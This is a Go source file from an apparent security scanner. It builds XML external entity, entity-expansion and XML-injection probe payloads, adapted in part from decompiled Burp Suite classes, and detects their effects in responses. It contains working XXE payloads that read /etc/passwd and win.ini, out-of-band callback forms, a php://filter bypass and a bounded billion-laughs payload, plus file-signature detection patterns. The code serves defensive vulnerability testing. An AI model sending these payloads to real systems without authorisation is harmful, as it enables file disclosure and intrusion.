package scanner

// XML external-entity / entity-expansion / structural-injection primitive,
// corresponding to three declined catalog rows:
//   - "XML external entity injection" (1049600 / burp.Zf8g.APIP_Xxe, decline
//     reason in check_registry.go: "requires an XML parser and controlled
//     external-entity resolver")
//   - "XML entity expansion" (4196096 / burp.Zf8g.APR_XmlEntityExpansion /
//     APIP_XmlEntityExpansion, decline reason in check_registry_declined.go:
//     "XML entity expansion (billion-laughs) detection requires submitting a
//     recursively defined external/internal entity and observing resource
//     exhaustion or expansion")
//   - "XML injection" (1050368 / burp.Zf8g.APIP_XmlInjection)
//
// CRITICAL DESIGN CONSTRAINT — read this before using anything below:
// Go's encoding/xml package does NOT resolve external entities, and does not
// expand even internal general entities declared in a DOCTYPE's internal
// subset (it treats the whole "<!DOCTYPE ...>" as one opaque Directive
// token; a later "&name;" reference that isn't one of the five predefined
// XML entities is a decode error, full stop). That is exactly why this
// cannot be "a thin wrapper around encoding/xml": there is nothing in the
// standard library that will actually perform the resolution a real XXE
// probe depends on. This package therefore does NOT attempt to make Go's
// parser resolve entities, and never will. What it builds instead is (a)
// payload *generators* — the exact request bodies/fragments a future check
// would send to a *target's* parser, which may well resolve them — and (b)
// a *detector* for evidence of that resolution appearing in a response. A
// reader must not assume WellFormed, or any other function here, parses or
// validates hostile XML the way a target's parser would; it only tells you
// whether Go's own (deliberately entity-blind) decoder can walk the token
// stream at all.
//
// Evidence recovered from /root/burp-re/out/strings/map_root.tsv and the
// decompiled sources it indexes (grep patterns and files noted per payload
// below):
//   - burp.Zge7 (the XXE file-retrieval prober behind the "XML external
//     entity injection" row) has an exact, live literal-string switch
//     (Zge7.ZC) building all four of: SYSTEM "file:///c:/windows/win.ini",
//     SYSTEM "file:///etc/passwd", and their "...X" canary/negative-control
//     variants (the same path with a trailing "X" appended, so a genuinely
//     broken path can be compared against the real one to rule out a parser
//     that just echoes any SYSTEM value regardless of resolution). Read in
//     full at out/clean/root/Zge7.java. XXEFilePayloads below reuses this
//     exact DOCTYPE shape and these exact two file targets; it does not
//     reproduce the "X" canary variants (this package has no baseline/probe
//     differential of its own — that comparison belongs to the future
//     check, not this primitive).
//   - burp.Zeix (parameter-entity OOB channel) has the literal
//     "<!DOCTYPE §§§ [<!ENTITY % " ... " SYSTEM \"http://" ... "\">%" ...
//     "; ]>" construction (Zeix.ZT, out/clean/root/Zeix.java) — the
//     parameter-entity form Burp itself sends when a target strips general
//     entity references from element content but still parses its DOCTYPE.
//     "§§§" is Burp's own placeholder for the target document's real root
//     element name (a strict parser requires the DOCTYPE name to match it);
//     it is reproduced literally, not resolved, since this package never
//     sees the target document.
//   - burp.Zcli (out/clean/root/Zcli.java) has the literal
//     "<!DOCTYPE §§§ PUBLIC \"-//B/A/EN\" \"http://" ... "\">" — a second,
//     distinct OOB channel: a PUBLIC external-subset fetch that some parsers
//     perform even with no ENTITY declaration at all.
//   - burp.Zch5 (out/clean/root/Zch5.java) has the literal
//     "<?xml-stylesheet type=\"text/xml\" href=\"http://" ... "\"?>" — a
//     third OOB channel via a stylesheet processing instruction in the
//     prolog, needing no DOCTYPE.
//   - burp.Zbiw's XInclude branch (out/clean/root/Zbiw.java, method ZK) has
//     the literal "xmlns:xi=\"http://www.w3.org/2001/XInclude\">"
//     + "<xi:include href=\"http://" ... "/foo\"/" — reproduced verbatim by
//     XIncludePayload, including the fixed "/foo" href suffix.
//   - burp.Zgij (the entity-expansion prober behind "XML entity expansion",
//     out/clean/root/Zgij.java, methods Zh/ZR) is real, confirmed BILLION
//     LAUGHS: nested doubling entities named with a shared prefix and a
//     level suffix ("<!ENTITY <name0> \"<seed>\">", then for each level
//     "<!ENTITY <nameN> \"&<nameN-1>;&<nameN-1>;\">"), never a milder
//     "quadratic blowup". Its own prefix literal is "xee" (confirmed via
//     map_root.tsv grep for burp.Zgij: "<!DOCTYPE foo [<!ENTITY", "xee",
//     the surrounding quote/ampersand/semicolon fragments, and "]>"), which
//     EntityExpansionPayloads' billion-laughs entry reuses. The
//     quadratic-blowup entry has NO Burp equivalent in this decompilation —
//     it is a second, deliberately milder, publicly documented technique
//     (a single bounded-size entity referenced N times, giving O(N) growth
//     instead of Burp's O(2^N)) included because the catalog row's own
//     description ("XML entity expansion") does not require the exponential
//     form specifically, and offering a check two probes of different
//     expansion *shape* is more likely to surface a parser with a depth
//     limit but no total-size limit, or vice versa.
//   - burp.Zp7s (the active dispatcher behind "XML injection",
//     out/clean/root/Zp7s.java) and burp.Zf5e (its passive counterpart)
//     have NO recoverable literal payload text at all: Zp7s.ZQ and Zp7s.Zw
//     are both decompiler "parseGraph" failures (opaque bytecode dumps, no
//     Java source), and Zf5e's only string-shaped logic is a passive
//     heuristic (does the existing field value already look like XML —
//     starts with "<", ends with ">" — Zf5e.Za) with no payload construction
//     at all. XMLInjectionPayloads' four structural probes (unclosed tag,
//     sibling element, CDATA breakout, comment breakout) are therefore
//     documented, industry-standard XML-injection techniques (the same
//     families described in the OWASP XML Injection and PortSwigger XML
//     injection references), NOT values recovered from Burp — stated here
//     explicitly per this project's evidence-honesty rule.
//   - The php://filter/convert.base64-encode/resource= variant in
//     XXEFilePayloads has no Burp literal either (Zge7's switch only ever
//     builds the two plain file:// targets and their canaries). It is
//     included as a documented, industry-standard bypass for filters that
//     block the literal substring "file://" in a SYSTEM value while still
//     permitting other URI schemes, wrapped around the same /etc/passwd
//     target Zge7 already proves is meaningful for this codebase. Labelled
//     as such, not as recovered.

import (
	"bytes"
	"encoding/xml"
	"io"
	"regexp"
	"strconv"
	"strings"
)

// ---------------------------------------------------------------------------
// Payload shape
// ---------------------------------------------------------------------------

// XXEKind classifies the delivery mechanism (or, for XXEStructuralInjection,
// the lack of one) behind an XXEPayload, so a caller can filter or label
// probes without string-matching Name.
type XXEKind uint8

const (
	// XXEFileRead is a classic DOCTYPE/general-entity probe whose SYSTEM
	// identifier names a local file the target parser is asked to read and
	// substitute inline.
	XXEFileRead XXEKind = iota
	// XXEOOBHTTP is any probe whose success is observed out-of-band (an
	// HTTP fetch the target parser makes to a caller-controlled URL), via a
	// general entity, a PUBLIC doctype external subset, or an
	// xml-stylesheet processing instruction.
	XXEOOBHTTP
	// XXEParameterEntity is specifically the parameter-entity ("<!ENTITY %
	// name ...>") form, which some targets still evaluate even when a
	// general-entity reference is stripped from element content.
	XXEParameterEntity
	// XXEBillionLaughs is the nested, exponentially-doubling entity form.
	XXEBillionLaughs
	// XXEQuadraticBlowup is the flat, linearly-repeated single-entity form.
	XXEQuadraticBlowup
	// XXEXInclude is the xi:include-directive form, for endpoints that
	// reject a DOCTYPE outright but still honour the XInclude namespace.
	XXEXInclude
	// XXEStructuralInjection is a non-XXE probe: it tests whether raw XML
	// metacharacters in an inserted value can alter document structure
	// (unclosed tag, injected sibling, CDATA/comment breakout), with no
	// entity or external-resource involvement at all.
	XXEStructuralInjection
)

// XXEPayload is one probe this package can generate: Body is the exact text
// meant to be sent (either as a complete document or, where the file-level
// doc comment on a specific generator says so, a fragment meant to be
// spliced into an existing one), Marker is the shortest substring whose
// unprocessed appearance in a response would prove the payload was not
// parsed/resolved at all (used by DetectXXEEvidence's reflected-verbatim
// check), and Kind identifies the delivery mechanism.
type XXEPayload struct {
	Name   string
	Body   string
	Marker string
	Kind   XXEKind
}

// ---------------------------------------------------------------------------
// File-read payloads
// ---------------------------------------------------------------------------

// XXEFilePayloads builds classic DOCTYPE/general-entity file-read probes:
// the Unix /etc/passwd target and the Windows win.ini target exactly as
// burp.Zge7 constructs them (see file header), plus a php://filter-wrapped
// variant of the same Unix target (documented industry technique, not a
// Burp literal — see file header).
//
// marker is appended to the fixed "xxe" entity-name prefix (mirroring
// Zge7's own "xxe" + random-suffix naming, without this package generating
// randomness itself — deterministic output is easier to test and the
// caller is free to pass a scan-unique value). An empty marker is fine; it
// just means every call uses the bare entity name "xxe".
func XXEFilePayloads(marker string) []XXEPayload {
	entity := "xxe" + marker
	build := func(label, uri string) XXEPayload {
		return XXEPayload{
			Name:   label,
			Body:   `<!DOCTYPE foo [<!ENTITY ` + entity + ` SYSTEM "` + uri + `"> ]><foo>&` + entity + `;</foo>`,
			Marker: uri,
			Kind:   XXEFileRead,
		}
	}
	return []XXEPayload{
		build("XXE file read: /etc/passwd (Unix)", "file:///etc/passwd"),
		build("XXE file read: win.ini (Windows)", "file:///c:/windows/win.ini"),
		build(
			"XXE file read: /etc/passwd via php://filter base64 wrapper (bypasses a filter that blocks the literal substring \"file://\")",
			"php://filter/convert.base64-encode/resource=/etc/passwd",
		),
	}
}

// ---------------------------------------------------------------------------
// Out-of-band payloads
// ---------------------------------------------------------------------------

// xxeStripScheme removes a leading "http://" or "https://" from url, since
// every recovered OOB literal already bakes "http://" in ahead of the
// placeholder. Callers may pass callbackURL with or without a scheme; only
// these two literal prefixes are recognised.
func xxeStripScheme(url string) string {
	for _, scheme := range [...]string{"https://", "http://"} {
		if len(url) >= len(scheme) && strings.EqualFold(url[:len(scheme)], scheme) {
			return url[len(scheme):]
		}
	}
	return url
}

// XXEOutOfBandPayloads builds every OOB delivery channel recovered from
// Burp's XXE dispatcher (burp.Zwe_, which instantiates one prober per
// applicable IssueType — see file header for Zeix/Zcli/Zch5 citations) that
// makes the target parser reach out to callbackURL: a general SYSTEM
// entity, a parameter entity (the form that survives a filter blocking
// direct general-entity references — see XXEParameterEntity's doc comment),
// a PUBLIC doctype external-subset fetch, and an xml-stylesheet processing
// instruction. callbackURL should be a URL or bare host:port the caller
// owns and can observe interactions against (e.g. from internal/oob); this
// package only formats it into the four payload shapes, it does not manage
// the OOB channel itself.
//
// The PUBLIC-doctype and xml-stylesheet forms are complete document
// prologs, not fragments to splice into element content — they replace (or
// stand in as) the target document's own prolog. The general and
// parameter-entity forms are complete standalone documents.
func XXEOutOfBandPayloads(callbackURL string) []XXEPayload {
	host := xxeStripScheme(callbackURL)

	return []XXEPayload{
		{
			Name:   "XXE out-of-band: general SYSTEM entity -> HTTP callback",
			Body:   `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://` + host + `">]><foo>&xxe;</foo>`,
			Marker: host,
			Kind:   XXEOOBHTTP,
		},
		{
			Name:   "XXE out-of-band: parameter entity -> HTTP callback (works when a general-entity reference in element content is filtered but the DOCTYPE's internal subset is not)",
			Body:   `<!DOCTYPE §§§ [<!ENTITY % pxxe SYSTEM "http://` + host + `">%pxxe; ]>`,
			Marker: "%pxxe;",
			Kind:   XXEParameterEntity,
		},
		{
			Name:   "XXE out-of-band: PUBLIC doctype external-subset fetch -> HTTP callback (no ENTITY declaration needed)",
			Body:   `<!DOCTYPE §§§ PUBLIC "-//B/A/EN" "http://` + host + `">`,
			Marker: host,
			Kind:   XXEOOBHTTP,
		},
		{
			Name:   "XXE out-of-band: xml-stylesheet processing instruction -> HTTP callback (no DOCTYPE needed)",
			Body:   `<?xml-stylesheet type="text/xml" href="http://` + host + `"?>`,
			Marker: host,
			Kind:   XXEOOBHTTP,
		},
	}
}

// ---------------------------------------------------------------------------
// Entity-expansion payloads (bounded)
// ---------------------------------------------------------------------------

// xxeEntityExpansionLevels is the nesting depth of the billion-laughs
// payload below: level L's entity value is "&<L-1>;&<L-1>;" (two references
// to the previous level), so L levels expand a single top-level reference
// by exactly 2^L. Fixed at 10 so the cap below is an exact power of two and
// reviewable at a glance.
const xxeEntityExpansionLevels = 10

// MaxXMLEntityExpansionFactor bounds every entity-expansion payload this
// package builds, expressed as the ratio between a fully successful
// expansion's size and the handful of bytes actually written into the
// DOCTYPE. An *unbounded* entity-expansion payload — the real
// "billion laughs" attack, which reliably drives a vulnerable parser's
// memory use into the gigabytes from a few hundred bytes of input — is a
// denial-of-service tool, not a test: running one against a target we are
// auditing (as opposed to a target that has separately consented to a DoS
// test) is the very attack this scanner exists to help find, not commit.
// Both payloads EntityExpansionPayloads returns expand by at most this
// factor — a few KB, not gigabytes — which is enough to observe a parser's
// *reaction* (an expansion-limit error, a measurably slower response) even
// against a target with no expansion limit configured at all, without ever
// materialising more than a trivial amount of memory.
const MaxXMLEntityExpansionFactor = 1 << xxeEntityExpansionLevels

// xxeEntityExpansionSeed is the innermost entity's literal value for the
// billion-laughs payload and the single entity's value for the
// quadratic-blowup payload. Its content is arbitrary and safe by
// construction; only its length (8 bytes) matters for sizing the expansion.
const xxeEntityExpansionSeed = "AAAAAAAA"

// buildBillionLaughsPayload reproduces burp.Zgij's real construction (see
// file header): entities named with a shared "xee" prefix and a level
// suffix, each level doubling the previous, bounded to
// xxeEntityExpansionLevels levels (factor 2^xxeEntityExpansionLevels ==
// MaxXMLEntityExpansionFactor by construction — see that constant's doc
// comment for why this bound exists).
func buildBillionLaughsPayload() XXEPayload {
	name := func(level int) string { return "xee" + strconv.Itoa(level) }

	var b strings.Builder
	b.WriteString(`<!DOCTYPE foo [<!ENTITY `)
	b.WriteString(name(0))
	b.WriteString(` "`)
	b.WriteString(xxeEntityExpansionSeed)
	b.WriteString(`">`)

	prev := name(0)
	for level := range xxeEntityExpansionLevels {
		cur := name(level + 1)
		b.WriteString(`<!ENTITY `)
		b.WriteString(cur)
		b.WriteString(` "&`)
		b.WriteString(prev)
		b.WriteString(`;&`)
		b.WriteString(prev)
		b.WriteString(`;">`)
		prev = cur
	}
	b.WriteString(`]>`)

	top := prev
	return XXEPayload{
		Name:   "XML entity expansion: billion laughs (bounded nested doubling, factor <= MaxXMLEntityExpansionFactor)",
		Body:   b.String() + `<foo>&` + top + `;</foo>`,
		Marker: "&" + top + ";",
		Kind:   XXEBillionLaughs,
	}
}

// buildQuadraticBlowupPayload is the milder, publicly documented sibling to
// billion laughs: one entity of fixed size, referenced
// MaxXMLEntityExpansionFactor times with no nesting, so the response, if
// expanded, grows linearly rather than exponentially in reference count.
// It has no Burp equivalent in this decompilation (see file header) and is
// included to probe for a depth limit without a total-size limit, or vice
// versa.
func buildQuadraticBlowupPayload() XXEPayload {
	const entity = "xee"
	var refs strings.Builder
	for range MaxXMLEntityExpansionFactor {
		refs.WriteString("&" + entity + ";")
	}
	return XXEPayload{
		Name:   "XML entity expansion: quadratic blowup (bounded single-entity repetition, factor == MaxXMLEntityExpansionFactor)",
		Body:   `<!DOCTYPE foo [<!ENTITY ` + entity + ` "` + xxeEntityExpansionSeed + `">]><foo>` + refs.String() + `</foo>`,
		Marker: "&" + entity + ";",
		Kind:   XXEQuadraticBlowup,
	}
}

// EntityExpansionPayloads returns the two bounded entity-expansion probes:
// billion laughs (exponential, matching Burp's own recovered construction)
// and quadratic blowup (linear, documented industry technique). Both are
// capped at MaxXMLEntityExpansionFactor — see that constant's doc comment
// for why an unbounded version is never offered.
func EntityExpansionPayloads() []XXEPayload {
	return []XXEPayload{buildBillionLaughsPayload(), buildQuadraticBlowupPayload()}
}

// ---------------------------------------------------------------------------
// XInclude payload
// ---------------------------------------------------------------------------

// XIncludePayload reproduces burp.Zbiw's XInclude probe verbatim (see file
// header): an xmlns:xi attribute declaration immediately followed by an
// <xi:include> element whose href points at marker (a caller-owned
// host/URL, analogous to callbackURL in XXEOutOfBandPayloads) with the
// fixed "/foo" path suffix Zbiw itself uses. This is a FRAGMENT, not a
// standalone document: it is meant to be spliced into an already-open root
// start-tag's attribute list — e.g. turning "<root>" into
// "<root xmlns:xi=\"...\"><xi:include href=\"...\"/>" — for endpoints that
// reject an inserted DOCTYPE outright but still parse an XInclude
// directive already inside the document's own namespace scope.
func XIncludePayload(marker string) XXEPayload {
	return XXEPayload{
		Name:   "XInclude directive (for DOCTYPE-rejecting endpoints)",
		Body:   `xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://` + marker + `/foo"/`,
		Marker: marker,
		Kind:   XXEXInclude,
	}
}

// ---------------------------------------------------------------------------
// Structural XML-injection payloads
// ---------------------------------------------------------------------------

// XMLInjectionPayloads builds four documented, industry-standard structural
// XML-injection probes (see file header for why these are not Burp
// literals): inserting canary in a way that either breaks the surrounding
// markup or, if the surrounding sink tolerates it, introduces new markup of
// its own. Each is meant for substitution into an existing attacker
// -controlled value inside an XML document body (a text node, a CDATA
// section, or a comment), not as a standalone document.
func XMLInjectionPayloads(canary string) []XXEPayload {
	return []XXEPayload{
		{
			Name:   "XML injection: unclosed tag",
			Body:   "<" + canary,
			Marker: canary,
			Kind:   XXEStructuralInjection,
		},
		{
			Name:   "XML injection: injected sibling element",
			Body:   "<" + canary + ">injected</" + canary + ">",
			Marker: canary,
			Kind:   XXEStructuralInjection,
		},
		{
			Name:   "XML injection: CDATA breakout",
			Body:   "]]>" + canary + "<![CDATA[",
			Marker: canary,
			Kind:   XXEStructuralInjection,
		},
		{
			Name:   "XML injection: comment breakout",
			Body:   "-->" + canary + "<!--",
			Marker: canary,
			Kind:   XXEStructuralInjection,
		},
	}
}

// ---------------------------------------------------------------------------
// Evidence detection
// ---------------------------------------------------------------------------

// XXEEvidence is the bitmask of XXE/entity-expansion signal classes
// DetectXXEEvidence can find in a response body.
type XXEEvidence uint8

const (
	// XXEEvidenceNone is the zero value: nothing in the response body
	// matched any recognised signal. This means "no signal was visible",
	// never "no vulnerability exists" — a blind/OOB-only XXE leaves no
	// trace here by design; see XXEEvidence.Text.
	XXEEvidenceNone XXEEvidence = 0

	// XXEEvidenceFileContentSignature means a targeted local file's known
	// content signature (e.g. /etc/passwd's "root:x:0:0:" line, or win.ini's
	// stock section headers, or a plausible base64 blob for the
	// php://filter variant) is present in the response — the strongest
	// signal: the external entity was actually resolved and read.
	XXEEvidenceFileContentSignature XXEEvidence = 1 << (iota - 1)

	// XXEEvidenceParserEntityError means a real XML-parser error message
	// naming the rejected/undeclared entity is present (libxml2, .NET
	// System.Xml, or Java/Xerces phrasing — see xxeParserEntityErrorPresent).
	// This means the payload reached genuine entity-resolution code, even
	// though resolution itself was refused.
	XXEEvidenceParserEntityError

	// XXEEvidenceExpansionLimitHit means a real parser expansion-limit
	// error (Xerces/JDK's JAXP00010001, .NET's maxCharactersFromEntities,
	// or libxml2's nesting/loop guards) is present, meaning the parser
	// attempted the nested expansion and then refused it.
	XXEEvidenceExpansionLimitHit

	// XXEEvidenceReflectedVerbatim means the payload's Marker (or its full
	// Body) came back unchanged in the response — evidence AGAINST
	// processing: the value was treated as inert text, not parsed.
	XXEEvidenceReflectedVerbatim
)

// xxeFileSignatures are real, stock first-line/first-section-header
// fragments of the two files XXEFilePayloads targets: /etc/passwd's first
// line on every stock Unix system, and win.ini's first two stock section
// headers on every stock Windows install.
var xxeFileSignatures = [...]string{
	"root:x:0:0:",
	"[fonts]",
	"[extensions]",
}

// xxeBase64BlobRe recognises a response body that is, once trimmed, nothing
// but a long run of base64 alphabet characters — the shape a
// php://filter/convert.base64-encode/resource= read produces. 40 characters
// is well above what a coincidental short token would produce while still
// well under a real file's encoded length.
var xxeBase64BlobRe = regexp.MustCompile(`^[A-Za-z0-9+/]{40,}={0,2}$`)

// xxeFileContentSignaturePresent reports whether body contains a targeted
// file's known content signature. The base64-blob heuristic only applies
// when payload is specifically the php://filter variant (identified by its
// Marker), so an unrelated long token elsewhere never false-positives this
// bit for a plain file-read payload.
func xxeFileContentSignaturePresent(body string, payload XXEPayload) bool {
	for _, sig := range xxeFileSignatures {
		if strings.Contains(body, sig) {
			return true
		}
	}
	if payload.Kind == XXEFileRead && strings.Contains(payload.Marker, "php://filter") {
		return xxeBase64BlobRe.MatchString(strings.TrimSpace(body))
	}
	return false
}

// xxeParserEntityErrorPatterns are real error-message fragments raised by
// mainstream XML parsers when an entity reference is undeclared/rejected:
// libxml2 (PHP DOMDocument, Python lxml), Java/Xerces SAXParseException,
// and .NET System.Xml.XmlException.
var xxeParserEntityErrorPatterns = []*regexp.Regexp{
	regexp.MustCompile(`Entity '[^']+' not defined`),
	regexp.MustCompile(`entity "[^"]+" was referenced, but not declared`),
}

// xxeParserEntityErrorPresent reports whether body contains a recognised
// parser error naming a rejected/undeclared entity.
func xxeParserEntityErrorPresent(body string) bool {
	for _, re := range xxeParserEntityErrorPatterns {
		if re.MatchString(body) {
			return true
		}
	}
	// .NET's message is "System.Xml.XmlException: Reference to undeclared
	// entity 'x'. ..." — matched as a same-message AND rather than one
	// regex, so an unrelated XmlException elsewhere in a large body (with
	// no entity wording at all) does not false-positive this bit.
	return strings.Contains(body, "XmlException") && strings.Contains(body, "undeclared entity")
}

// xxeExpansionLimitPatterns are real fragments of the expansion-limit
// errors mainstream parsers raise once a billion-laughs-style payload
// crosses their built-in guard: Xerces/JDK's JAXP00010001 message, .NET's
// maxCharactersFromEntities limit name, and libxml2's nesting/loop guards.
var xxeExpansionLimitPatterns = [...]string{
	"jaxp00010001",
	"entity expansions in this document",
	"maxcharactersfromentities",
	"maximum entity nesting depth",
	"entity reference loop",
}

// xxeExpansionLimitHit reports whether body contains a recognised
// entity-expansion-limit error, matched case-insensitively since parsers
// disagree on capitalisation of otherwise-identical wording.
func xxeExpansionLimitHit(body string) bool {
	lower := strings.ToLower(body)
	for _, p := range xxeExpansionLimitPatterns {
		if strings.Contains(lower, p) {
			return true
		}
	}
	return false
}

// xxeReflectedVerbatim reports whether payload's Marker, or its full Body,
// appears unchanged in body. Marker is checked first since it is short and
// robust against whitespace/formatting differences a large Body would be
// sensitive to.
func xxeReflectedVerbatim(body string, payload XXEPayload) bool {
	if payload.Marker != "" && strings.Contains(body, payload.Marker) {
		return true
	}
	return payload.Body != "" && strings.Contains(body, payload.Body)
}

// DetectXXEEvidence classifies a response body against the payload that
// produced it, with no network or storage access, so the decision table is
// independently testable. It is safe to call with any payload/body pair,
// including an unrelated body that shares no evidence with payload at all
// (in which case it returns XXEEvidenceNone).
func DetectXXEEvidence(responseBody string, payload XXEPayload) XXEEvidence {
	var e XXEEvidence
	if xxeFileContentSignaturePresent(responseBody, payload) {
		e |= XXEEvidenceFileContentSignature
	}
	if xxeParserEntityErrorPresent(responseBody) {
		e |= XXEEvidenceParserEntityError
	}
	if xxeExpansionLimitHit(responseBody) {
		e |= XXEEvidenceExpansionLimitHit
	}
	if xxeReflectedVerbatim(responseBody, payload) {
		e |= XXEEvidenceReflectedVerbatim
	}
	return e
}

// Text renders the detected XXE evidence classes as prose, strongest signal
// first, mirroring corsEvidenceText/cspEvidenceText's shape in
// checks_headers.go and MailInjectionEvidence.Text's shape in infra_smtp.go.
func (e XXEEvidence) Text() string {
	if e == XXEEvidenceNone {
		return "no XXE/entity-expansion signal was visible in the response body (this does not rule out a blind/out-of-band effect with no visible trace in this exchange)"
	}
	var parts []string
	if e&XXEEvidenceFileContentSignature != 0 {
		parts = append(parts, "a targeted local file's known content signature is present, indicating the external entity was resolved and its content returned")
	}
	if e&XXEEvidenceParserEntityError != 0 {
		parts = append(parts, "an XML parser error naming the rejected/undeclared entity is present, indicating the payload reached real entity-resolution code")
	}
	if e&XXEEvidenceExpansionLimitHit != 0 {
		parts = append(parts, "a parser entity-expansion-limit error is present, indicating the parser attempted and then refused the nested/repeated expansion")
	}
	if e&XXEEvidenceReflectedVerbatim != 0 {
		parts = append(parts, "the payload was reflected verbatim as inert text — evidence against real XML/entity processing")
	}
	return strings.Join(parts, "; ")
}

// ---------------------------------------------------------------------------
// Well-formedness check
// ---------------------------------------------------------------------------

// WellFormed reports whether raw decodes as a complete, syntactically valid
// XML token stream, using encoding/xml — safe by construction precisely
// because that package does not resolve entities (see the file-level doc
// comment). On success it returns true, "". On failure it returns false and
// the decoder's error text, which callers can use to decide whether a
// response is even XML before attempting to classify it.
//
// A payload built by this file that references an undeclared external/
// general entity (any XXEFileRead or XXEOOBHTTP payload) will itself report
// ok=false with an "unknown entity" style error from this function — that
// is a property of Go's decoder, not a signal about how a real target's
// parser would treat the same bytes, so WellFormed must never be used as a
// substitute for DetectXXEEvidence when judging a target's behaviour.
func WellFormed(raw []byte) (bool, string) {
	dec := xml.NewDecoder(bytes.NewReader(raw))
	for {
		_, err := dec.Token()
		if err == io.EOF {
			return true, ""
		}
		if err != nil {
			return false, err.Error()
		}
	}
}
